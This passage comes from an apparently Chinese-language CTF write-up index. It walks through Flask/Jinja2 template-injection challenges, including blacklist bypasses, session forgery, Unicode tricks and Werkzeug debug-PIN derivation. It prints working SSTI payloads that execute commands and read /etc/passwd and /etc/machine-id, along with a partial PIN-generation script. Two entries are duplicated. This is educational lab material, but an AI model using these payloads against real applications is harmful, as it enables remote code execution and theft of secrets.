<p></p> <p>\u6d4b\u8bd5\u53d1\u73b0\u5b58\u5728\u6a21\u677f\u6ce8\u5165</p> <p></p> <p>\u6ce8\u5165 <code>config</code> \u6ca1\u88ab\u8fc7\u6ee4</p> <p></p> <p>\u8fc7\u6ee4\u4e86 <code>globals</code></p> <p></p> <p>\u91c7\u7528\u5b57\u7b26\u62fc\u63a5\u7ed5\u8fc7\uff0c\u901a\u8fc7 <code>__globals__</code> \u53ef\u4ee5\u8bbf\u95ee\u5230 <code>os</code> \u6a21\u5757</p> <pre><code># os.popen() \u662f os \u6a21\u5757\u4e2d\u7684\u4e00\u4e2a\u65b9\u6cd5\uff0c\u7528\u4e8e\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5e76\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u5bf9\u8c61\n# read() \u662f\u6587\u4ef6\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u7528\u4e8e\u8bfb\u53d6\u547d\u4ee4\u6267\u884c\u7684\u7ed3\u679c\n?search={{config.__init__['__global'+'s__'].os.popen(\"whoami\").read()}}\n</code></pre> <p></p> <p>\u4fee\u6539\u547d\u4ee4\u7591\u4f3c\u627e\u5230 flag</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter11/11-11/","title":"attr \u8fc7\u6ee4\u5668\u6a21\u677f\u6ce8\u5165\u653b\u51fb","text":""},{"location":"Web/Chapter11/11-11/#attr-\u8fc7\u6ee4\u5668\u6a21\u677f\u6ce8\u5165\u653b\u51fb","title":"attr \u8fc7\u6ee4\u5668\u6a21\u677f\u6ce8\u5165\u653b\u51fb","text":"<p>\u6211\u53d1\u73b0 Python \u7684\u5c5e\u6027\u8bbf\u95ee\uff08\u70b9\u7b26\u53f7 ( <code>.</code>)\u3001\u4e0b\u6807\u8bed\u6cd5 ( <code>[]</code>)\u3001<code>getattr</code> \u7b49\u7b49\uff09\u548c\u4e0b\u5212\u7ebf\u90fd\u88ab\u5217\u5165\u4e86\u9ed1\u540d\u5355</p> <p>\u901a\u8fc7\u5206\u6790 Jinja2 \u7684\u8fc7\u6ee4\u5668\uff0c\u53d1\u73b0\u53ef\u4ee5\u4f7f\u7528 <code>attr</code> \u8fc7\u6ee4\u5668\u6765\u8bbf\u95ee\u5bf9\u8c61\u5c5e\u6027\uff0c\u800c\u65e0\u9700\u4f7f\u7528 <code>.</code></p> <p>Python \u5b57\u7b26\u4e32\u53ef\u4ee5\u901a\u8fc7\u5b57\u8282\u8868\u793a\u6765\u7ed5\u8fc7\u5b57\u7b26\u8fc7\u6ee4\uff0c\u4f8b\u5982\u4f7f\u7528 <code>\\x5f</code> \u4ee3\u66ff <code>_</code></p> <p>\u4f7f\u7528 <code>attr()</code> \u8c03\u7528\u6784\u5efa\u4e86\u4e00\u4e2a\u94fe</p> <pre><code>{{config|attr('__class__')}}\n</code></pre> <p><code>{{config|attr('__class__')}}</code> \u4f1a\u8f93\u51fa config \u5bf9\u8c61\u7684\u7c7b\u578b\uff0c\u5373 flask.config.Config \u7c7b</p> <p>1\ufe0f\u20e3 <code>config</code></p> <p><code>config</code> \u662f Flask \u5e94\u7528\u7684\u914d\u7f6e\u5bf9\u8c61</p> <p>\u5b83\u901a\u5e38\u5b58\u50a8\uff1a</p> <ul> <li><code>SECRET_KEY</code></li> <li>\u6570\u636e\u5e93\u8fde\u63a5\u5b57\u7b26\u4e32</li> <li>\u8c03\u8bd5\u6a21\u5f0f\u5f00\u5173</li> <li>\u5176\u4ed6\u5e94\u7528\u914d\u7f6e</li> </ul> <p>2\ufe0f\u20e3 <code>|attr('__class__')</code></p> <p>Jinja2 \u7684 <code>attr</code> \u8fc7\u6ee4\u5668\u5141\u8bb8\u8bbf\u95ee\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u76f8\u5f53\u4e8e Python \u91cc\u7684 <code>getattr(obj, attr_name)</code></p> <pre><code>config|attr('__class__') == getattr(config, \"__class__\")\n</code></pre> <p>\u5341\u516d\u8fdb\u5236\u7f16\u7801</p> <pre><code>{{config|attr('\\x5f\\x5fclass\\x5f\\x5f')}}\n</code></pre> <p>\u62ff\u5230 OS \u6a21\u5757</p> <pre><code>{{config|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')}}\n</code></pre> <p>1\ufe0f\u20e3 <code>config</code></p> <p>\u8fd9\u662f Flask \u5e94\u7528\u4e2d\u7684\u914d\u7f6e\u5bf9\u8c61\uff08<code>flask.config.Config</code> \u5b9e\u4f8b\uff09\u3002  \u5b83\u7ee7\u627f\u81ea Python \u5b57\u5178\uff0c\u5b58\u653e\u5e94\u7528\u914d\u7f6e\u3002</p> <p>2\ufe0f\u20e3 <code>|attr('\\x5f\\x5fclass\\x5f\\x5f')</code></p> <p>\u8fd9\u91cc\u7684 <code>\\x5f</code> \u662f\u4e0b\u5212\u7ebf <code>_</code> \u7684\u5341\u516d\u8fdb\u5236\u8868\u793a</p> <ul> <li><code>\\x5f\\x5fclass\\x5f\\x5f</code> = <code>__class__</code></li> <li>\u6240\u4ee5\u8fd9\u4e00\u6b65\u76f8\u5f53\u4e8e <code>config.__class__</code>\uff0c\u5373\u5f97\u5230\u7c7b\u5bf9\u8c61 <code>&lt;class 'flask.config.Config'&gt;</code></li> </ul> <p>3\ufe0f\u20e3 <code>|attr('\\x5f\\x5finit\\x5f\\x5f')</code></p> <ul> <li>\u8bbf\u95ee <code>Config</code> \u7c7b\u7684 <code>__init__</code> \u65b9\u6cd5\uff08\u6784\u9020\u51fd\u6570\uff09</li> <li>\u5728 Python \u91cc\uff0c\u65b9\u6cd5\u672c\u8d28\u4e0a\u662f \u51fd\u6570\u5bf9\u8c61</li> </ul> <p>4\ufe0f\u20e3 <code>|attr('\\x5f\\x5fglobals\\x5f\\x5f')</code></p> <ul> <li>\u6bcf\u4e2a\u51fd\u6570\u5bf9\u8c61\u90fd\u6709 <code>__globals__</code> \u5c5e\u6027 \u2192 \u5b83\u662f\u4e00\u4e2a\u5b57\u5178\uff0c\u8868\u793a\u8fd9\u4e2a\u51fd\u6570\u5b9a\u4e49\u65f6\u7684\u5168\u5c40\u547d\u540d\u7a7a\u95f4</li> <li>\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u91cc\u6211\u4eec\u62ff\u5230\u4e86 <code>Config.__init__</code> \u7684\u5168\u5c40\u53d8\u91cf\u5b57\u5178</li> </ul> <p>\u91cc\u9762\u901a\u5e38\u5305\u542b\uff1a</p> <ul> <li><code>__builtins__</code></li> <li><code>os</code></li> <li><code>sys</code></li> <li>\u5176\u4ed6 Flask / Python \u5168\u5c40\u5bf9\u8c61</li> </ul> <p>5\ufe0f\u20e3 <code>|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')</code></p> <ul> <li> <p><code>__getitem__</code> \u662f Python \u5bb9\u5668\u7c7b\u578b\uff08\u6bd4\u5982\u5b57\u5178\uff09\u7684\u53d6\u503c\u65b9\u6cd5\uff0c\u76f8\u5f53\u4e8e <code>dict['key']</code></p> </li> <li> <p>\u8fd9\u91cc\u8c03\u7528 <code>__getitem__('os')</code>\uff0c\u76f8\u5f53\u4e8e\uff1a</p> </li> </ul> <pre><code>config.__class__.__init__.__globals__['os']\n</code></pre> <p>\u6700\u540e\uff0c\u6211\u6267\u884c\u4e86\u8bfb\u53d6\u6807\u5fd7\u7684\u547d\u4ee4</p> <pre><code>{{ config | attr('\\x5f\\x5fclass\\x5f\\x5f') | attr('\\x5f\\x5finit\\x5f\\x5f') | attr('\\x5f\\x5fglobals\\x5f\\x5f') | attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os') | attr('popen')('cat flag') | attr('read')() }}\n</code></pre>"},{"location":"Web/Chapter11/11-12/","title":"\u5341\u516d\u8fdb\u5236\u7f16\u7801\u7ed5\u8fc7","text":""},{"location":"Web/Chapter11/11-12/#\u5341\u516d\u8fdb\u5236\u7f16\u7801\u7ed5\u8fc7","title":"\u5341\u516d\u8fdb\u5236\u7f16\u7801\u7ed5\u8fc7","text":"<p>\u6211\u53d1\u73b0 Python \u7684\u5c5e\u6027\u8bbf\u95ee\uff08\u70b9\u7b26\u53f7 ( <code>.</code>)\u3001\u4e0b\u6807\u8bed\u6cd5 ( <code>[]</code>)\u3001<code>getattr</code> \u7b49\u7b49\uff09\u548c\u4e0b\u5212\u7ebf\u90fd\u88ab\u5217\u5165\u4e86\u9ed1\u540d\u5355</p> <p>\u901a\u8fc7\u5206\u6790 Jinja2 \u7684\u8fc7\u6ee4\u5668\uff0c\u53d1\u73b0\u53ef\u4ee5\u4f7f\u7528 <code>attr</code> \u8fc7\u6ee4\u5668\u6765\u8bbf\u95ee\u5bf9\u8c61\u5c5e\u6027\uff0c\u800c\u65e0\u9700\u4f7f\u7528 <code>.</code></p> <p>Python \u5b57\u7b26\u4e32\u53ef\u4ee5\u901a\u8fc7\u5b57\u8282\u8868\u793a\u6765\u7ed5\u8fc7\u5b57\u7b26\u8fc7\u6ee4\uff0c\u4f8b\u5982\u4f7f\u7528 <code>\\x5f</code> \u4ee3\u66ff <code>_</code></p> <p>\u4f7f\u7528 <code>attr()</code> \u8c03\u7528\u6784\u5efa\u4e86\u4e00\u4e2a\u94fe</p> <pre><code>{{config|attr('__class__')}}\n</code></pre> <p><code>{{config|attr('__class__')}}</code> \u4f1a\u8f93\u51fa config \u5bf9\u8c61\u7684\u7c7b\u578b\uff0c\u5373 flask.config.Config \u7c7b</p> <p>1\ufe0f\u20e3 <code>config</code></p> <p><code>config</code> \u662f Flask \u5e94\u7528\u7684\u914d\u7f6e\u5bf9\u8c61</p> <p>\u5b83\u901a\u5e38\u5b58\u50a8\uff1a</p> <ul> <li><code>SECRET_KEY</code></li> <li>\u6570\u636e\u5e93\u8fde\u63a5\u5b57\u7b26\u4e32</li> <li>\u8c03\u8bd5\u6a21\u5f0f\u5f00\u5173</li> <li>\u5176\u4ed6\u5e94\u7528\u914d\u7f6e</li> </ul> <p>2\ufe0f\u20e3 <code>|attr('__class__')</code></p> <p>Jinja2 \u7684 <code>attr</code> \u8fc7\u6ee4\u5668\u5141\u8bb8\u8bbf\u95ee\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u76f8\u5f53\u4e8e Python \u91cc\u7684 <code>getattr(obj, attr_name)</code></p> <pre><code>config|attr('__class__') == getattr(config, \"__class__\")\n</code></pre> <p>\u5341\u516d\u8fdb\u5236\u7f16\u7801</p> <pre><code>{{config|attr('\\x5f\\x5fclass\\x5f\\x5f')}}\n</code></pre> <p>\u62ff\u5230 OS \u6a21\u5757</p> <pre><code>{{config|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')}}\n</code></pre> <p>1\ufe0f\u20e3 <code>config</code></p> <p>\u8fd9\u662f Flask \u5e94\u7528\u4e2d\u7684\u914d\u7f6e\u5bf9\u8c61\uff08<code>flask.config.Config</code> \u5b9e\u4f8b\uff09\u3002  \u5b83\u7ee7\u627f\u81ea Python \u5b57\u5178\uff0c\u5b58\u653e\u5e94\u7528\u914d\u7f6e\u3002</p> <p>2\ufe0f\u20e3 <code>|attr('\\x5f\\x5fclass\\x5f\\x5f')</code></p> <p>\u8fd9\u91cc\u7684 <code>\\x5f</code> \u662f\u4e0b\u5212\u7ebf <code>_</code> \u7684\u5341\u516d\u8fdb\u5236\u8868\u793a</p> <ul> <li><code>\\x5f\\x5fclass\\x5f\\x5f</code> = <code>__class__</code></li> <li>\u6240\u4ee5\u8fd9\u4e00\u6b65\u76f8\u5f53\u4e8e <code>config.__class__</code>\uff0c\u5373\u5f97\u5230\u7c7b\u5bf9\u8c61 <code>&lt;class 'flask.config.Config'&gt;</code></li> </ul> <p>3\ufe0f\u20e3 <code>|attr('\\x5f\\x5finit\\x5f\\x5f')</code></p> <ul> <li>\u8bbf\u95ee <code>Config</code> \u7c7b\u7684 <code>__init__</code> \u65b9\u6cd5\uff08\u6784\u9020\u51fd\u6570\uff09</li> <li>\u5728 Python \u91cc\uff0c\u65b9\u6cd5\u672c\u8d28\u4e0a\u662f \u51fd\u6570\u5bf9\u8c61</li> </ul> <p>4\ufe0f\u20e3 <code>|attr('\\x5f\\x5fglobals\\x5f\\x5f')</code></p> <ul> <li>\u6bcf\u4e2a\u51fd\u6570\u5bf9\u8c61\u90fd\u6709 <code>__globals__</code> \u5c5e\u6027 \u2192 \u5b83\u662f\u4e00\u4e2a\u5b57\u5178\uff0c\u8868\u793a\u8fd9\u4e2a\u51fd\u6570\u5b9a\u4e49\u65f6\u7684\u5168\u5c40\u547d\u540d\u7a7a\u95f4</li> <li>\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u91cc\u6211\u4eec\u62ff\u5230\u4e86 <code>Config.__init__</code> \u7684\u5168\u5c40\u53d8\u91cf\u5b57\u5178</li> </ul> <p>\u91cc\u9762\u901a\u5e38\u5305\u542b\uff1a</p> <ul> <li><code>__builtins__</code></li> <li><code>os</code></li> <li><code>sys</code></li> <li>\u5176\u4ed6 Flask / Python \u5168\u5c40\u5bf9\u8c61</li> </ul> <p>5\ufe0f\u20e3 <code>|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')</code></p> <ul> <li> <p><code>__getitem__</code> \u662f Python \u5bb9\u5668\u7c7b\u578b\uff08\u6bd4\u5982\u5b57\u5178\uff09\u7684\u53d6\u503c\u65b9\u6cd5\uff0c\u76f8\u5f53\u4e8e <code>dict['key']</code></p> </li> <li> <p>\u8fd9\u91cc\u8c03\u7528 <code>__getitem__('os')</code>\uff0c\u76f8\u5f53\u4e8e\uff1a</p> </li> </ul> <pre><code>config.__class__.__init__.__globals__['os']\n</code></pre> <p>\u6700\u540e\uff0c\u6211\u6267\u884c\u4e86\u8bfb\u53d6\u6807\u5fd7\u7684\u547d\u4ee4</p> <pre><code>{{ config | attr('\\x5f\\x5fclass\\x5f\\x5f') | attr('\\x5f\\x5finit\\x5f\\x5f') | attr('\\x5f\\x5fglobals\\x5f\\x5f') | attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os') | attr('popen')('cat flag') | attr('read')() }}\n</code></pre>"},{"location":"Web/Chapter11/11-2/","title":"Secret_key \u6cc4\u9732","text":""},{"location":"Web/Chapter11/11-2/#secret_key-\u6cc4\u9732","title":"Secret_key \u6cc4\u9732","text":"<p>\u67e5\u770b\u6ce8\u91ca\u5f97\u5230\u63d0\u793a</p> <p></p> <p>SECRET_KEY \u7528\u4e8e\u52a0\u5bc6\u548c\u89e3\u5bc6\u7528\u6237\u7684\u4f1a\u8bdd Cookie\uff0c\u4ee5\u9632\u6b62\u9ed1\u5ba2\u901a\u8fc7\u7be1\u6539cookie\u6765\u5192\u5145\u7528\u6237</p> <p>\u9898\u76ee\u63d0\u793a\u662f\u6a21\u677f\u6ce8\u5165\uff0c\u6d4b\u8bd5\u4e00\u4e0b</p> <p></p> <p>\u76f4\u63a5\u8bbf\u95ee\u62ff\u5230 flag\uff0c\u4e0d\u61c2\u8fd9\u4e2a config \u7684\u53ef\u4ee5\u53bb\u770b\u7b2c\u4e00\u8282</p> <p></p>"},{"location":"Web/Chapter11/11-3/","title":"Session \u4f2a\u9020","text":""},{"location":"Web/Chapter11/11-3/#session-\u4f2a\u9020","title":"Session \u4f2a\u9020","text":"<p>\u6ce8\u518c\u8d26\u53f7\u767b\u5f55\u63d0\u793a\u4e0d\u662f admin</p> <p></p> <p>\u7ee7\u7eed\u67e5\u627e\u53d1\u73b0\u7f51\u7ad9\u6e90\u7801\u6cc4\u9732</p> <p></p> <p>Flask \u6846\u67b6\u4ec5\u5bf9 session \u8fdb\u884c\u4e86\u7b7e\u540d\uff0c\u7b7e\u540d\u7684\u4f5c\u7528\u662f\u9632\u7be1\u6539\u800c\u65e0\u6cd5\u9632\u6b62\u88ab\u8bfb\u53d6</p> <p>\u6240\u4ee5\u5176 session \u7684\u5168\u90e8\u5185\u5bb9\u90fd\u662f\u53ef\u4ee5\u5728\u5ba2\u6237\u7aef\u8bfb\u53d6\u7684</p> <p>\u5047\u8bbe\u73b0\u5728\u6211\u4eec\u6709\u4e00\u4e32 session \u503c\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u811a\u672c\u89e3\u5bc6</p> <p></p> <p>\u89e3\u5bc6\u540e\u80fd\u770b\u5230 'name': '\u6ce8\u518c\u7684\u7528\u6237\u540d'\uff0c\u6211\u4eec\u9700\u8981\u5c06\u7528\u6237\u540d\u6539\u4e3a admin \u52a0\u5bc6\u66ff\u6362</p> <p>\u52a0\u5bc6\u5c31\u9700\u8981\u5bc6\u7801\uff0c\u4f46\u662f config.py \u6cc4\u9732\u4e86\u5bc6\u7801</p> <p></p> <p>\u6253\u5f00 BurpSuite \u6293\u5305\u62e6\u622a\uff0c\u66ff\u6362\u6389 Session \u53d1\u9001\uff0c\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter11/11-4/","title":"Unicode \u7f16\u7801\u7ed5\u8fc7 strlower()","text":""},{"location":"Web/Chapter11/11-4/#unicode-\u5b57\u7b26\u7ed5\u8fc7-strlower","title":"Unicode \u5b57\u7b26\u7ed5\u8fc7 strlower()","text":"<p>\u68c0\u6d4b\u6e90\u4ee3\u7801\u53d1\u73b0\u6f0f\u6d1e\u51fd\u6570 strlower</p> <p></p> <p>\u8ddf\u8fdb\u53d1\u73b0\u5728\u767b\u5f55\u548c\u6ce8\u518c\u90fd\u6709\u4f7f\u7528</p> <p></p> <p>\u539f\u7406\u5c31\u662f\u8fd9\u4e2a\u51fd\u6570\u5904\u7406\u5b57\u7b26\u4e32\u7684\u8fc7\u7a0b</p> <p></p> <p>\u7b2c\u4e00\u79cd\u5b57\u7b26\u5c31\u662f Unicode\uff0c\u5177\u4f53\u5b57\u7b26\u5f62\u5f0f\u53ef\u4ee5\u5728\u8fd9\u4e2a\u7f51\u7ad9\u4e0a\u67e5\u627e</p> <p></p> <p>\u5148\u4f7f\u7528\u8fd9\u4e2a\u4f5c\u4e3a\u7528\u6237\u540d\u6ce8\u518c\uff0c\u53ef\u4ee5\u770b\u5230\u53d8\u4e3a\u4e86 ADMIN</p> <p></p> <p>\u518d\u6b21\u66f4\u6539\u5bc6\u7801\u8c03\u7528\u51fd\u6570\u4f7f\u5176\u53d8\u4e3a admin</p> <p></p> <p>\u4f7f\u7528 admin \u767b\u5f55\uff0c\u5bc6\u7801\u4e3a\u521a\u521a\u4fee\u6539\u7684\u5bc6\u7801\uff0c\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter11/11-5/","title":"\u6a21\u677f\u6ce8\u5165\u653b\u51fb","text":""},{"location":"Web/Chapter11/11-5/#\u6a21\u677f\u6ce8\u5165\u653b\u51fb","title":"\u6a21\u677f\u6ce8\u5165\u653b\u51fb","text":"<p>\u8bbf\u95ee flag \u56de\u663e\u4e86 IP</p> <p></p> <p>\u6253\u5f00\u63d0\u793a\u9875\u9762</p> <p></p> <p>\u53f3\u952e\u6e90\u4ee3\u7801\u95ee\u600e\u4e48\u77e5\u9053 IP \u7684</p> <p></p> <p>\u63a8\u6d4b\u662f\u83b7\u53d6\u4e86 XFF \u6765\u56de\u663e\uff0c\u6253\u5f00 BurpSuite \u6293\u5305\u4fee\u6539\u53d1\u73b0\u53ef\u63a7</p> <p></p> <p>\u4fee\u6539\u4e3a\u6a21\u677f\u8fd0\u7b97\u53d1\u73b0\u88ab\u6267\u884c\u4e86</p> <p></p> <p>\u6539\u4e3a system \u6765\u6267\u884c\u547d\u4ee4</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter11/11-6/","title":"url_for \u51fd\u6570\u6a21\u677f\u6ce8\u5165\u653b\u51fb","text":""},{"location":"Web/Chapter11/11-6/#url_for-\u51fd\u6570\u6a21\u677f\u6ce8\u5165\u653b\u51fb","title":"url_for \u51fd\u6570\u6a21\u677f\u6ce8\u5165\u653b\u51fb","text":"<p>\u6253\u5f00\u7f51\u9875\u62ff\u5230\u6e90\u4ee3\u7801</p> <pre><code>import flask\nimport os\n\napp = flask.Flask(__name__)\n\napp.config['FLAG'] = os.environ.pop('FLAG')\n\n@app.route('/')\ndef index():\n    return open(__file__).read()\n\n@app.route('/shrine/&lt;path:shrine&gt;')\ndef shrine(shrine):\n\n    def safe_jinja(s):\n        s = s.replace('(', '').replace(')', '')\n        blacklist = ['config', 'self']\n        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s\n\n    return flask.render_template_string(safe_jinja(shrine))\n\nif __name__ == '__main__':\n    app.run(debug=True)\n</code></pre> <p>\u7b2c\u4e8c\u4e2a\u8def\u7531\u5728 <code>/shrine/</code> \u8def\u5f84\u4e0b\u63d0\u4ea4\u53c2\u6570</p> <p>\u6211\u4eec\u7b80\u5355\u6d4b\u8bd5\u6ce8\u5165 <code>/shrine/{{2+2}}</code></p> <p></p> <p>\u9ed1\u540d\u5355\u4e2d\u8fc7\u6ee4\u4e86 config \u53ca self</p> <p>url_for() \u4f1a\u8fd4\u56de\u89c6\u56fe\u51fd\u6570\u5bf9\u5e94\u7684URL</p> <p>\u6211\u4eec\u6ce8\u5165 <code>{url_for.__globals__}</code> \u5f97\u5230</p> <p></p> <p>\u7ee7\u7eed\u6ce8\u5165\u5f53\u524d <code>app</code> \u7684 <code>config</code></p> <p></p>"},{"location":"Web/Chapter11/11-7/","title":"\u5b57\u7b26\u62fc\u63a5\u7ed5\u8fc7","text":""},{"location":"Web/Chapter11/11-7/#\u5b57\u7b26\u62fc\u63a5\u7ed5\u8fc7","title":"\u5b57\u7b26\u62fc\u63a5\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u662f\u7528 Flask \u505a\u7684 Base64 \u52a0\u89e3\u5bc6</p> <p></p> <p>\u6d4b\u8bd5 SSTI \u6ce8\u5165</p> <p></p> <p>\u89e3\u5bc6\u5f97\u5230 7\uff0c\u8bf4\u660e\u89e3\u5bc6\u5904\u5b58\u5728\u6ce8\u5165</p> <p></p> <p>\u5728\u89e3\u5bc6\u5904\u968f\u4fbf\u8f93\u5165\u5b57\u7b26\u53d1\u73b0\u62a5\u9519\u4fe1\u606f</p> <p></p> <p>\u67e5\u770b decode() \u51fd\u6570\u53d1\u73b0\u6709 waf</p> <p></p> <p>\u6784\u9020 payload \u62ff\u6e90\u7801</p> <pre><code>[].__class__: \u83b7\u53d6\u7a7a\u5217\u8868\u7684\u7c7b\uff0c\u5217\u8868\u7684\u7c7b\u662f list\n.__base__: \u83b7\u53d6 list \u7c7b\u7684\u57fa\u7c7b\uff0c\u57fa\u7c7b\u901a\u5e38\u662f object\n.__subclasses__(): \u83b7\u53d6\u8be5\u7c7b\u7684\u6240\u6709\u5b50\u7c7b\nc.__name__: \u8fd9\u4e2a\u5c5e\u6027\u8fd4\u56de\u7c7b\u7684\u540d\u79f0\nc.__init__: \u83b7\u53d6 catch_warnings \u7c7b\u7684\u6784\u9020\u65b9\u6cd5\uff08__init__\uff09\n.__globals__: \u83b7\u53d6\u5f53\u524d\u51fd\u6570\u6216\u65b9\u6cd5\u7684\u5168\u5c40\u547d\u540d\u7a7a\u95f4\n['__builtins__']: \u901a\u8fc7 __globals__ \u5b57\u5178\u8bbf\u95ee Python \u5185\u5efa\u6a21\u5757 __builtins__\nopen('app.py', 'r').read(): \u6253\u5f00\u540d\u4e3a app.py \u7684\u6587\u4ef6\u5e76\u8bfb\u53d6\u5176\u5185\u5bb9\n\n{% for c in [].__class__.__base__.__subclasses__() %}\n   {% if c.__name__=='catch_warnings' %}\n    {{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}\n   {% endif %}\n{% endfor %}\n</code></pre> <pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read() }}{% endif %}{% endfor %}\n</code></pre> <p>\u5148\u52a0\u5bc6</p> <p></p> <p>\u89e3\u5bc6\u62ff\u5230\u6e90\u7801</p> <p></p> <p>\u5173\u4e8e waf \u4ee3\u7801\u5982\u4e0b</p> <pre><code>def waf(str):\n      black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;]\n  for x in black_list :\n      if x in str.lower() :\n      return 1\n</code></pre> <p>\u867d\u7136\u8fc7\u6ee4\u4e86\u5f88\u591a\uff0c\u4f46\u662f\u53ef\u4ee5\u5229\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\u6f0f\u6d1e\u7ed5\u8fc7</p> <p>\u5148\u67e5\u770b\u76ee\u5f55</p> <pre><code>{% for c in [].__class__.__base__.__subclasses__() %}\n   {% if c.__name__=='catch_warnings' %}\n    {{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/') }}\n   {% endif %}\n{% endfor %}\n</code></pre> <pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}\n</code></pre> <p></p> <p>\u6784\u9020 payload \u62ff\u5230 flag</p> <pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}\n</code></pre>"},{"location":"Web/Chapter11/11-8/","title":"\u89e3\u5bc6 PIN \u7801","text":""},{"location":"Web/Chapter11/11-8/#\u89e3\u5bc6-pin-\u7801","title":"\u89e3\u5bc6 PIN \u7801","text":"<p>\u67e5\u770b\u63d0\u793a\u662f PIN \u7801</p> <p></p> <p>\u53ef\u4ee5\u77e5\u9053 PIN \u4e3b\u8981\u7531 <code>probably_public_bits</code> \u548c <code>private_bits</code> \u4e24\u4e2a\u5217\u8868\u53d8\u91cf\u51b3\u5b9a\uff0c\u800c\u8fd9\u4e24\u4e2a\u5217\u8868\u53d8\u91cf\u53c8\u7531\u5982\u4e0b 6 \u4e2a\u53d8\u91cf\u51b3\u5b9a\uff1a</p> <ul> <li><code>username</code> \u542f\u52a8\u8fd9\u4e2a Flask \u7684\u7528\u6237</li> <li><code>modname</code> \u4e00\u822c\u9ed8\u8ba4 flask.app</li> <li><code>getattr(app, '__name__', getattr(app.__class__, '__name__'))</code> \u4e00\u822c\u9ed8\u8ba4 flask.app \u4e3a Flask</li> <li><code>getattr(mod, '__file__', None)</code>\u4e3a flask \u76ee\u5f55\u4e0b\u7684\u4e00\u4e2a app.py \u7684\u7edd\u5bf9\u8def\u5f84,\u53ef\u5728\u7206\u9519\u9875\u9762\u770b\u5230</li> <li><code>str(uuid.getnode())</code> \u5219\u662f\u7f51\u5361 MAC \u5730\u5740\u7684\u5341\u8fdb\u5236\u8868\u8fbe\u5f0f</li> <li><code>get_machine_id()</code> \u7cfb\u7edf id</li> </ul> <p>\u4ece\u4e4b\u524d\u7684\u62a5\u9519\u4e2d\u53ef\u4ee5\u5f97\u5230</p> <ul> <li><code>modname</code>\uff1a<code>flask.app</code></li> <li><code>getattr(app, '__name__', getattr(app.__class__, '__name__'))</code>\uff1a<code>Flask</code></li> <li><code>getattr(mod, '__file__', None)</code>\uff1a<code>/usr/local/lib/python3.7/site-packages/flask/app.py</code></li> </ul> <p></p> <p>\u6784\u9020 payload \u8bfb\u53d6 passwd \u6587\u4ef6\uff08\u770b\u4e0d\u61c2\u53c2\u8003\u4e0a\u4e00\u8282\uff09</p> <pre><code>{% for x in {}.__class__.__base__.__subclasses__() %}\n    {% if \"warning\" in x.__name__ %}\n        {{x.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}\n    {% endif %}\n{% endfor %}\n</code></pre> <p>\u5f97\u5230\u8fd0\u884c Flask \u7684\u7528\u6237\u540d\uff1a<code>flaskweb</code></p> <p></p> <p>\u8bfb Mac \u5730\u5740</p> <pre><code>{% for x in {}.__class__.__base__.__subclasses__() %}\n    {% if \"warning\" in x.__name__ %}\n        {{x.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address').read() }}\n    {% endif %}\n{% endfo r%}\n</code></pre> <p></p> <p>\u8bfb\u7cfb\u7edf id</p> <pre><code>{% for x in {}.__class__.__base__.__subclasses__() %}\n    {% if \"warning\" in x.__name__ %}\n        {{x.__init__.__globals__['__builtins__'].open('/etc/machine-id').read() }}\n    {% endif %}\n{% endfor %}\n</code></pre> <p></p> <p>\u7528\u811a\u672c\u751f\u6210 PIN \u7801</p> <pre><code>import hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'flaskweb'# username\n    'flask.app',# modname\n    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\n\nprivate_bits = [\n    '231530469832647',# str(uuid.getnode()),  /sys/class/net/eth0/address\n    '1408f836b0ca514d796cbf8960e45fa1'# get_machine_id(), 